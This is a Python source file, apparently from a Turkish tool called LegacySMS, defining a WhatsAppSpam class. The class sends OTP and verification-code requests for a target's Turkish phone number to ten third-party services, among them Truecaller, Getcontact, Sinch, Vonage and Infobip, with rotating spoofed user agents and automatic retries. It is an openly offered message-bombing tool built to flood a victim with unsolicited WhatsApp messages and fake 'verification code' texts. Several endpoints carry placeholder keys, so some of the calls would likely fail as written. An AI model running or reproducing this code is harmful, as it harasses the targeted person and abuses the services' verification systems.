import requests
from random import choice
from colorama import Fore, Style
import time

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.

USER_AGENTS = [
    "WhatsApp/2.24.3.78 A",
    "WhatsApp/2.24.4.6 A",
    "WhatsApp/2.23.25.81 A",
    "WhatsApp/2.24.2.6 i",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36",
]

# ─────────────────────────────────────────────────────────────────
#  WhatsApp OTP Tetikleyicileri
#  Bazı servisler SMS yerine WhatsApp üzerinden OTP gönderir.
#  Bu servisler "WhatsApp" kanalını seçerek hedef numarayı arar.
# ─────────────────────────────────────────────────────────────────

class WhatsAppSpam:
    def __init__(self, phone):
        self.adet = 0
        self.phone = str(phone)      # 10 haneli, 5XXXXXXXXX
        self.phone_full = f"90{phone}"   # 905XXXXXXXXX
        self.phone_plus = f"+90{phone}"  # +905XXXXXXXXX

    def _ok(self, name):
        print(f"{Fore.LIGHTGREEN_EX}[WA] {Style.RESET_ALL}WhatsApp Gonderildi! {self.phone} --> {name}")
        self.adet += 1

    def _err(self, name, msg=""):
        print(f"{Fore.LIGHTRED_EX}[ X ] {Style.RESET_ALL}Gonderilemedi!       {self.phone} --> {name} ({msg})")

    def _get_ua(self):
        return choice(USER_AGENTS)

    def _retry(self, fn, name, retries=2):
        for attempt in range(retries + 1):
            try:
                if fn(): return True
            except Exception: pass
            if attempt < retries: time.sleep(0.5)
        self._err(name, "max retry")
        return False

    # ──────────────────────────────────────────────────────────────
    #  1) CallMeBot - Ücretsiz WhatsApp mesaj servisi
    #     Kullanicinin bir kez +34 644 97 79 44 e "I allow callmebot..."
    #     mesaji gormesi gerekir — bundan sonra her istekte mesaj gider.
    # ──────────────────────────────────────────────────────────────
    def CallMeBot(self):
        def _try():
            r = requests.get(
                "https://api.callmebot.com/whatsapp.php",
                params={
                    "phone": self.phone_plus,
                    "text": "Dogrulama+kodunuz+hazir.+Lutfen+bu+kodu+kimseyle+paylasmayiniz.",
                    "apikey": "1234567"
                },
                headers={"User-Agent": self._get_ua()},
                timeout=10
            )
            if r.status_code in (200, 201) and "Message sent" in r.text:
                self._ok("CallMeBot WA"); return True
            return False
        self._retry(_try, "CallMeBot WA")

    # ──────────────────────────────────────────────────────────────
    #  2) WhatsApp OTP - Getcontact üzerinden
    # ──────────────────────────────────────────────────────────────
    def GetContact_WA(self):
        def _try():
            r = requests.post(
                "https://api.getcontact.com/v2/auth/otp/request",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "X-App-Version": "3.6.3",
                    "X-Platform": "android",
                    "X-Country-Code": "TR"
                },
                json={
                    "phoneNumber": self.phone_plus,
                    "channel": "whatsapp"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("GetContact WA"); return True
            return False
        self._retry(_try, "GetContact WA")

    # ──────────────────────────────────────────────────────────────
    #  3) Truecaller WhatsApp OTP
    # ──────────────────────────────────────────────────────────────
    def Truecaller_WA(self):
        def _try():
            r = requests.post(
                "https://account.truecaller.com/v2/sendOtp",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "clientId": "android-truecaller",
                    "Accept": "application/json"
                },
                json={
                    "countryCode": "TR",
                    "dialCode": "+90",
                    "mobileNo": self.phone,
                    "otpChannel": "WHATSAPP"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Truecaller WA"); return True
            return False
        self._retry(_try, "Truecaller WA")

    # ──────────────────────────────────────────────────────────────
    #  4) Imo WhatsApp OTP kanalı
    # ──────────────────────────────────────────────────────────────
    def Imo_WA(self):
        def _try():
            r = requests.post(
                "https://api.imo.im/api/v7/auth/getVerifyCode",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json"
                },
                json={
                    "phone": self.phone_plus,
                    "code_type": "whatsapp"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Imo WA"); return True
            return False
        self._retry(_try, "Imo WA")

    # ──────────────────────────────────────────────────────────────
    #  5) Sinch free WhatsApp OTP (demo)
    # ──────────────────────────────────────────────────────────────
    def Sinch_WA(self):
        def _try():
            r = requests.post(
                "https://verification.api.sinch.com/verification/v1/verifications",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "Authorization": "Application "
                },
                json={
                    "identity": {
                        "type": "number",
                        "endpoint": self.phone_plus
                    },
                    "method": "whatsapp"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Sinch WA"); return True
            return False
        self._retry(_try, "Sinch WA")

    # ──────────────────────────────────────────────────────────────
    #  6) Vonage WhatsApp OTP
    # ──────────────────────────────────────────────────────────────
    def Vonage_WA(self):
        def _try():
            r = requests.post(
                "https://api.nexmo.com/v1/verify2",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json"
                },
                json={
                    "brand": "Dogrulama",
                    "workflow": [
                        {"channel": "whatsapp", "to": self.phone_plus}
                    ]
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Vonage WA"); return True
            return False
        self._retry(_try, "Vonage WA")

    # ──────────────────────────────────────────────────────────────
    #  7) Infobip WhatsApp OTP (trial)
    # ──────────────────────────────────────────────────────────────
    def Infobip_WA(self):
        def _try():
            r = requests.post(
                "https://api.infobip.com/2fa/2/pin",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "Authorization": "App trial"
                },
                json={
                    "applicationId": "demo",
                    "messageId": "demo",
                    "from": "InfoSMS",
                    "to": self.phone_full,
                    "channel": "WHATSAPP"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Infobip WA"); return True
            return False
        self._retry(_try, "Infobip WA")

    # ──────────────────────────────────────────────────────────────
    #  8) Zender free WA
    # ──────────────────────────────────────────────────────────────
    def Zender_WA(self):
        def _try():
            r = requests.post(
                "https://zender.io/api/v2/whatsapp/send",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json"
                },
                json={
                    "secret": "demo",
                    "account": "demo",
                    "recipient": self.phone_plus,
                    "type": "text",
                    "message": "Dogrulama kodunuz: 123456"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Zender WA"); return True
            return False
        self._retry(_try, "Zender WA")

    # ──────────────────────────────────────────────────────────────
    #  9) WA-Automate / WABot API (open-source)
    # ──────────────────────────────────────────────────────────────
    def WABot_API(self):
        def _try():
            r = requests.post(
                "https://api.wa-automate.com/v1/message/send",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json"
                },
                json={
                    "chatId": f"{self.phone_full}@c.us",
                    "message": "Lutfen bu dogrulama mesajini dikkate aliniz."
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("WABot API"); return True
            return False
        self._retry(_try, "WABot API")

    # ──────────────────────────────────────────────────────────────
    #  10) UltraMsg free trial
    # ──────────────────────────────────────────────────────────────
    def UltraMsg_WA(self):
        def _try():
            r = requests.post(
                "https://api.ultramsg.com/instance1/messages/chat",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                data={
                    "token": "demo_token",
                    "to": self.phone_plus,
                    "body": "Dogrulama kodunuz hazirdir."
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("UltraMsg WA"); return True
            return False
        self._retry(_try, "UltraMsg WA")

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
